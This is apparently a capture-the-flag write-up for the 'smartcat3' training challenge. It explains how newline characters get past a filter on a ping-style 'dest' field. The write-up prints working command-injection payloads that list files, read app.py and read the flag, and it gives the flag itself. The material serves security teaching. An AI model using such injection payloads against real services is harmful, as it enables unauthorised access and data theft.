# smartcat3

**Link**: [https://training03.webhack.it/](https://training03.webhack.it/)

After some tentatives I found that I couldn’t use some chars like `space ; & | \t`  so I couldn’t use them to concatenate the commands. After some search I found that I could use the `\n` so for convenience I used **python** to make tests. I found that I could use commands without space like `cat<file`, `more<file`, `ls`, `HOME=path`, `cd`, `pwd`. So I used them first to get what it was inside the `pwd` directory and I found the running code that was a **python** application that uses **cgi**:

```php
'dest':'127.0.0.1>/dev/null\nls
```

```php
'dest':'127.0.0.1>/dev/null\nls\ncat<app.py
```

After some tentatives I found the correct sequence of commands:

```php
'dest':'127.0.0.1>/dev/null\nHOME=/app/there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/\ncd\nls\nmore<flag'
```

Then I got the **flag**: `WIT{ymBNVfugDCmnit6}`